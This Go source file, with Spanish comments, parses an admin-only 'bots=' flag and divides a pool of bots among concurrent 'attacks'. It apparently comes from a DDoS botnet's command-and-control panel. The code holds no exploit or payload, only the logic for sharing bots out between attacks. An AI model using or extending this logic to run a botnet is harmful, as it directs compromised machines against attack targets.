package main

import (
	"fmt"
	"strconv"
	"strings"
)

// ProcessBotsFlag procesa la flag "bots=" en los argumentos del comando.
// Retorna:
//
//	newArgs: slice de argumentos sin la flag bots=
//	customBots: valor entero de bots (0 si no se especificó, -1 para todos, >0 para número concreto)
//	abort: true si hay error (usuario no admin o valor inválido)
//	errMsg: mensaje de error (vacío si abort == false)
func ProcessBotsFlag(args []string, user *User) (newArgs []string, customBots int, abort bool, errMsg string) {
	newArgs = make([]string, 0, len(args))
	customBots = 0
	abort = false

	if user.Admin {
		for _, arg := range args {
			if strings.HasPrefix(strings.ToLower(arg), "bots=") {
				parts := strings.SplitN(arg, "=", 2)
				if len(parts) == 2 {
					val, err := strconv.Atoi(parts[1])
					if err != nil {
						abort = true
						errMsg = "Invalid bots value, must be integer"
						return
					}
					customBots = val
				}
				// No agregar este argumento a newArgs
				continue
			}
			newArgs = append(newArgs, arg)
		}
	} else {
		// Usuario no admin: buscar flag bots=
		for _, arg := range args {
			if strings.HasPrefix(strings.ToLower(arg), "bots=") {
				abort = true
				errMsg = "You are not allowed to use 'bots' flag"
				return
			}
		}
		// Si no hay flag bots=, simplemente copiar argumentos
		newArgs = append(newArgs, args...)
	}
	return
}

// CalculateBotsToUse determina cuántos bots usar según la prioridad:
//   - Si customBots != 0, se usa ese valor (validando rango: -1 o 1..totalBots)
//   - Si no, se aplica la fracción global (totalBots / maxOngoing)
//
// Retorna: botsToUse, y un mensaje de error vacío si todo va bien.
func CalculateBotsToUse(totalBots, customBots int) (botsToUse int, errMsg string) {
	if customBots != 0 {
		// Administrador especificó un número
		if customBots == -1 {
			return totalBots, ""
		}
		if customBots > 0 && customBots <= totalBots {
			return customBots, ""
		}
		return 0, fmt.Sprintf("Invalid bots value: %d. Must be -1, or between 1 and %d", customBots, totalBots)
	}

	// Lógica de fracción por máximo global
	maxOngoing := Options.Templates.Attacks.MaximumOngoing
	if maxOngoing > 1 {
		botsToUse = totalBots / maxOngoing
		if botsToUse < 1 {
			botsToUse = 1
		}
		return botsToUse, ""
	}
	return totalBots, ""
}
